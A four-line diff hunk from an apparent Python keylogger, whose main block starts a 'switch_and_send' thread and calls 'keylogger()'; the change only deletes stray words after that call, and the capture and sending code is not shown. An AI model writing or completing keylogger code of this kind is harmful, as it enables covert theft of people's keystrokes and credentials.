@@ -95,4 +95,4 @@ def keylogger():
 
 if __name__ == "__main__":
     threading.Thread(target=switch_and_send, daemon=True).start()
-    keylogger() is this balanced and god
+    keylogger()
